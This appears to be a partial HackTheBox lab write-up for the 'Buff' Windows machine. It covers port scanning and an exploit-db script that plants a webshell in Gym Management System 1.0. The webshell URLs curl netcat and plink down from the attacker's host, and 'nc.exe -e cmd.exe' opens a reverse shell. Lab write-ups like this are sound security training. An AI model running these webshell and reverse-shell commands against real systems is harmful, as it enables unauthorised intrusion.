---
title: "HackTheBox — Buff"
date: 2020-10-27 23:59:00 +0530
categories: [HackTheBox,Windows Machines]
tags: [exploit-db]
image: /assets/img/Posts/Buff.png
---

> Buff windows machine by HackTheBox.com partial guide.

## Recon

Port scan:

``` shell

$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.198 

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-10-28 03:05:03 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 8080/tcp on 10.10.10.198                                  
Discovered open port 7680/tcp on 10.10.10.198 

```

Nmap over the ports found open:

``` shell
$ nmap -sC -sV -Pn -p8080,7680 10.10.10.198
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 11:10 AWST
Nmap scan report for 10.10.10.198
Host is up (0.26s latency).

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.61 seconds

```


## Gym Management System

Locate exploit on `exploit-db.com` for GMS v 1.0. Download python script and execute as per instructions.

``` shell
python kamehameha.py http://buff:8080/

            /\
/vvvvvvvvvvvv \--------------------------------------,                                                                                                                                                                          
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> 


C:\xampp\htdocs\gym\upload> dir
�PNG
▒
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\xampp\htdocs\gym\upload

28/10/2020  04:25    <DIR>          .
28/10/2020  04:25    <DIR>          ..
28/10/2020  04:25                53 kamehameha.php
               1 File(s)             53 bytes
               2 Dir(s)   9,836,687,360 bytes free


```

Ok now we need to upload some files for reverse TCP shell.


``` shell

sudo python -m SimpleHTTPServer 80

Serving HTTP on 0.0.0.0 port 80 ...

```

Lets upload some tools and enumerate

``` shell

http://buff:8080/upload/kamehameha.php?telepathy=whoami
http://buff:8080/upload/kamehameha.php?telepathy=curl -O 10.10.14.26:80/nc.exe
http://buff:8080/upload/kamehameha.php?telepathy=curl -O 10.10.14.26:80/plink.exe

```

Files uploaded:

``` shell

$ sudo python -m SimpleHTTPServer 80

Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.198 - - [28/Oct/2020 12:26:26] "GET /nc.exe HTTP/1.1" 200 -
10.10.10.198 - - [28/Oct/2020 12:26:39] "GET /plink.exe HTTP/1.1" 200 -

```

Make a listener to catch the shell `nc -lvvnp 1337`

Then we want to make the shell `buff:8080/upload/kamehameha.php?telepathy=nc.exe -e cmd.exe 10.10.14.26 1337`

And bingo:

``` shell

# nc -lvvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.198] 49776
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>whoami
whoami
buff\shaun

```








